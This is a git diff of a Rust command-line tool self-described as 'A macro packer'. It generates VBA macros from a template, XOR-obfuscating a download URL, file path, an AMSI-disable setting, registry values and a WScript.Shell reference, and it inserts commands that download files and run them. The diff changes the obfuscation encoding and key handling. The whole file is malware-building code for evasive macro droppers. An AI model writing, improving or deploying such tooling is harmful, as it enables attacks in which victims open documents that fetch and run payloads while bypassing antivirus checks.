@@ -103,19 +103,18 @@ End Sub
 "#;
 
 fn build_vba(key: &str, DEFAULT_DICT: HashMap<&str,&str> , commands: Vec<&str>) -> String {
-
-    let COMMANDS_TEMPLATES: HashMap<&str, &str> = HashMap::from([
-        ("dwld", r#"DownloadFile(Nuts("{value}"))"#),
-        ("exec", r#"Run("{value}")"#)
-    ]);
-
     let mut s = String::from(TEMPLATE);
-
+    s = s.replace("{baseHttpUrl}", &xor_encrypt(&key, &DEFAULT_DICT.get("baseHttpUrl").unwrap()));
     s = s.replace("{fileDownloadPath}", &xor_encrypt(&key, &DEFAULT_DICT.get("fileDownloadPath").unwrap()));
     s = s.replace("{amsiEnable}", &xor_encrypt(&key,&DEFAULT_DICT.get("amsiEnable").unwrap()));
     s = s.replace("{regClsId}", &xor_encrypt(&key,&DEFAULT_DICT.get("regClsId").unwrap()));
     s = s.replace("{regDword}", &xor_encrypt(&key,&DEFAULT_DICT.get("regDword").unwrap()));
     s = s.replace("{wscriptShell}", &xor_encrypt(&key,&DEFAULT_DICT.get("wscriptShell").unwrap()));
+
+    let COMMANDS_TEMPLATES: HashMap<&str, &str> = HashMap::from([
+        ("dwld", r#"DownloadFile(Nuts("{value}"))"#),
+        ("exec", r#"Run("{value}")"#)
+    ]);
 
     let mut cmds: Vec<String> = Vec::new();
     for cmd in commands {    
@@ -130,37 +129,35 @@ fn build_vba(key: &str, DEFAULT_DICT: HashMap<&str,&str> , commands: Vec<&str>) 
     s
 }
 
-fn xor_encrypt(key: &str, plaintext: &str) -> String {
-    let key_bytes = key.as_bytes();
-    let plaintext_bytes = plaintext.as_bytes();
-
-    let mut ciphertext = Vec::new();
-
-    for (i, &byte) in plaintext_bytes.iter().enumerate() {
-        let key_byte = key_bytes[i % key_bytes.len()];
-        let encrypted_byte = (byte + 17) ^ key_byte;
-        ciphertext.push(encrypted_byte);
+fn xor_encrypt(key: &str, s: &str) -> String {
+    let mut out = String::new();
+    for (idx, c) in s.chars().enumerate() {
+        let x = c as u8 + 17;
+        let k = key.chars().nth(idx % key.len()).unwrap() as u8;
+        let xored = x ^ k;
+        let y = format!("{:03}", xored);
+        out.push_str(&y);
     }
-    general_purpose::STANDARD_NO_PAD.encode(ciphertext)
+    out
 }
 
-fn xor_decrypt(key: &str, ciphertext: &str) -> String {
-    let key_bytes = key.as_bytes();
-    let ciphertext_bytes = general_purpose::STANDARD_NO_PAD.decode(ciphertext).unwrap();
-
-    let mut plaintext = Vec::new();
-
-    for (i, &byte) in ciphertext_bytes.iter().enumerate() {
-        let key_byte = key_bytes[i % key_bytes.len()];
-        let decrypted_byte = (byte ^ key_byte) - 17;
-        plaintext.push(decrypted_byte);
+fn xor_decrypt(key: &str, s: &str) -> String {
+    let mut out = String::new();
+    let mut idx = 0;
+    for i in (0..s.len()).step_by(3) {
+        let x = s[i..i+3].parse::<u8>().unwrap();
+        let k = key.chars().nth(idx % key.len()).unwrap() as u8;
+        let xored = x ^ k;
+        let decrypted = xored as i16 - 17;
+        let c = char::from_u32(decrypted as u32).unwrap();
+        out.push(c);
+        idx += 1;
     }
-
-    String::from_utf8(plaintext).expect("Invalid UTF-8 string")
+    out
 }
 
 #[derive(Parser, Debug)]
-#[clap(author="Marco Strambelli", version="0.9", about="A macro packer")]
+#[clap(author="Marco Strambelli", version="1.0", about="A macro packer")]
 struct Args {
     #[clap(short, long)]
     key: String,
@@ -185,18 +182,19 @@ fn main() {
     ]);
 
     let args = Args::parse();
+    let key = args.key.to_uppercase();
 
     let plaintext = "Hello, world!";
-    let ciphertext = xor_encrypt(&args.key, plaintext);
-    let decrypted_plaintext = xor_decrypt(&args.key, &ciphertext);
+    let ciphertext = xor_encrypt(&key, plaintext);
+    let decrypted_plaintext = xor_decrypt(&key, &ciphertext);
     assert_eq!(plaintext, decrypted_plaintext);
 
-    DEFAULT_DICT.insert("key", &args.key);
+    DEFAULT_DICT.insert("key", &key);
     DEFAULT_DICT.insert("baseHttpUrl", &args.base_http);
 
     let commands: Vec<&str> = args.commands.split(',').collect();
 
-    let vba = build_vba(&args.key, DEFAULT_DICT, commands);
+    let vba = build_vba(&key, DEFAULT_DICT, commands);
 
     println!("{:}", vba)
 }
